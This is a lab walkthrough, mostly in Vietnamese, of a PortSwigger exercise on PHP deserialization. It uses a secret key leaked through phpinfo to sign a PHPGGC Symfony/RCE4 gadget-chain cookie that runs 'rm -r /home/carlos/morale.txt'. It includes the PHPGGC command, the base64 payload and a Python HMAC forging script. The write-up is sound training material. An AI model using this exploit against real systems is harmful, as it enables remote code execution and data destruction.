
# Target Goal: 

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.

# Recon: 

Giống với bài lab trước, để inject được command và xóa file thì mình cần inject nó vào 1 object thông qua gadget chain. Đối với PHP, tool build sẵn các gadget chain thường được sử dụng là PHPGGC

Login vào và thấy cookie có thay đổi, dcode bằng HTML, nó bao gồm `token` và `sig_hmac_sha1` tức là lần này bảo mật cao hơn bằng cách tạo ra hmac_sha1:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/0b288885-bac2-49fb-86cf-07b9ae8fb467)

Trong khi đọc sourcecode thì mình cũng phát hiện ra 1 path dẫn tới phpinfo (debug hoặc chứa các thông tin cấu hình php)

![image](https://github.com/vanniichan/Portswigger/assets/112863484/49f389b8-c3fb-4e40-8763-017b3aa4e599)

![image](https://github.com/vanniichan/Portswigger/assets/112863484/4bfbcbae-a714-419b-b79a-628e0955fcd4)

HMAC_sha1 là một loại hash phải có secret key để có được mã hash hợp lệ

Vấn đề tiếp theo là dùng tool thứ 3 để tạo ra gadget chain nhưng lại chưa biết đúng pb hiện tại của nó để tạo đúng payload bằng cách tác động vào `token` hoặc `hmac_sha1` :

![image](https://github.com/vanniichan/Portswigger/assets/112863484/cba9fe4c-5599-4f4c-b6f1-6fdb2395fd92)

Chỉ có payload `Symfony/RCE4` VÀ `Symfony/RCE7` là đúng phiên bản:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/731c429b-6782-4037-b193-461237722bf9)

```
./phpggc Symfony/RCE4 system "rm -r /home/carlos/morale.txt" | base64 -w 0 > payload.txt

--------viết payload tạo hmac_sha1----------------
import hmac
import hashlib
import json
from urllib.parse import quote

payload = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyOToicm0gLXIgL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjY6InN5c3RlbSI7fX0K"
secret = "rmzykhemymvb10gg4elpgydg4o5maiu4"
sig_hmac_sha1 = hmac.new(secret.encode(), payload.encode(), hashlib.sha1).hexdigest()

cookie = json.dumps({"token": payload, "sig_hmac_sha1": sig_hmac_sha1})
encoded_cookie = quote(cookie)
print(encoded_cookie)
---------------------------------------------------

python pl.py
```
![image](https://github.com/vanniichan/Portswigger/assets/112863484/ce41e050-dfd5-47a4-b021-847a18c593f3)

# Flag: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/e114d986-862d-4634-b1a5-7643289ba856)
